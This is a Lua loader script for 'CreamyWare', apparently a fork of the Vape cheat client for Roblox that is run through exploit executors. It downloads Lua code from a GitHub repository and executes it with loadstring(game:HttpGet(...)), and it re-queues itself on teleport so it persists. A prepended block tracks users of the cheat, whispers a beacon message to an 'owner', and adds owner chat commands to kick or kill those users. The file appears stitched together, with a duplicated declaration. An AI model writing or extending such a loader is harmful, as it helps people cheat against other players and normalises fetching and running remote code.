local Players = game:GetService("Players")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- Setup tracking
_G.CreamyWareUsers = _G.CreamyWareUsers or {}
_G.CreamyWareUsers[LocalPlayer.UserId] = true

-- Whisper "helloimusingcw" to the owner if they're in-game
task.spawn(function()
    repeat task.wait() until _G.Owner
    local ownerPlayer = Players:GetPlayerByUserId(_G.Owner)
    if ownerPlayer and LocalPlayer.UserId ~= _G.Owner then
        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 5)
        :WaitForChild("SayMessageRequest")
        :FireServer("helloimusingcw", "Whisper", ownerPlayer.Name)
    end
end)

-- Chat Tag Display for All CreamyWare Users
TextChatService.OnIncomingMessage = function(message)
    local props = Instance.new("TextChatMessageProperties")
    if message.TextSource then
        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
        if sender and _G.CreamyWareUsers[sender.UserId] then
            local tag = sender.UserId == _G.Owner and (_G.OwnerTag or "CreamyWare Owner") or "CreamyWare User"
            props.PrefixText = `<font color="#CC00CC">[{tag}]</font> {message.PrefixText}`
        end
    end
    return props
end

-- Command Handling (Only Owner)
Players.PlayerChatted:Connect(function(sender, message)
    if not (_G.Owner and sender.UserId == _G.Owner) then return end
    message = message:lower()

    if message == ";kick cwu" then
        for _, target in ipairs(Players:GetPlayers()) do
            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
                target:Kick("Kicked by CreamyWare Owner")
            end
        end
    elseif message == ";kill cwu" then
        for _, target in ipairs(Players:GetPlayers()) do
            if target.UserId ~= _G.Owner and _G.CreamyWareUsers[target.UserId] then
                local char = target.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 0 end
            end
        end
    end
end)
repeat task.wait() until game:IsLoaded()
if shared.vape then shared.vape:Uninject() end

-- why do exploits fail to implement anything correctly? Is it really that hard?
if identifyexecutor then
	if table.find({'Argon', 'Wave'}, ({identifyexecutor()})[1]) then
		getgenv().setthreadidentity = nil
	end
end

local vape
local loadstring = function(...)
	local res, err = loadstring(...)
	if err and vape then
		vape:CreateNotification('Vape', 'Failed to load : '..err, 30, 'alert')
	end
	return res
end
local queue_on_teleport = queue_on_teleport or function() end
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/CreamyWare/CreamyWare/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function finishLoading()
	vape.Init = nil
	vape:Load()
	task.spawn(function()
		repeat
			vape:Save()
			task.wait(10)
		until not vape.Loaded
	end)

	local teleportedServers
	vape:Clean(playersService.LocalPlayer.OnTeleport:Connect(function()
		if (not teleportedServers) and (not shared.VapeIndependent) then
			teleportedServers = true
			local teleportScript = [[
				shared.vapereload = true
				if shared.VapeDeveloper then
					loadstring(readfile('newvape/loader.lua'), 'loader')()
				else
					loadstring(game:HttpGet('https://raw.githubusercontent.com/CreamyWare/CreamyWare/'..readfile('newvape/profiles/commit.txt')..'/loader.lua', true), 'loader')()
				end
			]]
			if shared.VapeDeveloper then
				teleportScript = 'shared.VapeDeveloper = true\n'..teleportScript
			end
			if shared.VapeCustomProfile then
				teleportScript = 'shared.VapeCustomProfile = "'..shared.VapeCustomProfile..'"\n'..teleportScript
			end
			vape:Save()
			queue_on_teleport(teleportScript)
		end
	end))

	if not shared.vapereload then
		if not vape.Categories then return end
		if vape.Categories.Main.Options['GUI bind indicator'].Enabled then
			vape:CreateNotification('CreamyWare has Finished Loading', vape.VapeButton and 'Press the button in the top right to open GUI' or 'Press '..table.concat(vape.Keybind, ' + '):upper()..' to open GUI', 5)
		end
	end
end

if not isfile('newvape/profiles/gui.txt') then
	writefile('newvape/profiles/gui.txt', 'new')
end
local gui = readfile('newvape/profiles/gui.txt')

if not isfolder('newvape/assets/'..gui) then
	makefolder('newvape/assets/'..gui)
end
vape = loadstring(downloadFile('newvape/guis/'..gui..'.lua'), 'gui')()
shared.vape = vape

if not shared.VapeIndependent then
	loadstring(downloadFile('newvape/games/universal.lua'), 'universal')()
	if isfile('newvape/games/'..game.PlaceId..'.lua') then
		loadstring(readfile('newvape/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(...)
	else
		if not shared.VapeDeveloper then
			local suc, res = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/CreamyWare/CreamyWare/'..readfile('newvape/profiles/commit.txt')..'/games/'..game.PlaceId..'.lua', true)
			end)
			if suc and res ~= '404: Not Found' then
				loadstring(downloadFile('newvape/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(...)
			end
		end
	end
	finishLoading()
else
	vape.Init = finishLoading
	return vape
end
